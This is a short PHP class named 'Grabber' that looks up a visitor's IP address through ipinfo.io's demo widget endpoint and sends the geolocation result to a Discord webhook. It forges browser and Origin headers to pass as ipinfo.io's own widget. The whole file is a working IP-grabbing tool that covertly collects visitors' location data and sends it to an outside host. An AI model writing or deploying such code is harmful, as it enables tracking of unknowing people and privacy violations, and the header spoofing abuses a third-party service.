<?php

namespace Geo;

require 'Aurora.php';
require 'Discord.php';

use Aurora\Server;
use Discord\Webhook;

class Grabber
{
    private string $_BASE_URL = 'https://ipinfo.io/widget/demo/';
    private array $_header;
    private array $_options;
    private array $_body;
    private Server $_server;

    public function __construct()
    {

        $this->_server = new Server();

        $this->_header = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "Content-Type: application/json",
            "Origin: https://ipinfo.io/",
        ];

        $this->_options = [
            CURLOPT_HTTPHEADER => $this->_header,
            CURLOPT_HTTPGET => 1,
            CURLOPT_RETURNTRANSFER => 1,
        ];

        $this->show();
    }

    private function show(): void
    {
        $instance = curl_init($this->_BASE_URL . $this->_server->ip());
        curl_setopt_array($instance, $this->_options);

        $response = $this->response($instance);
        $data = curl_getinfo($instance);

        $data["http_code"] == 200 ? new Webhook($response) : null;

        curl_close($instance);
    }

    private function response(object $instance): mixed
    {
        return json_decode(curl_exec($instance), 1);
    }

}
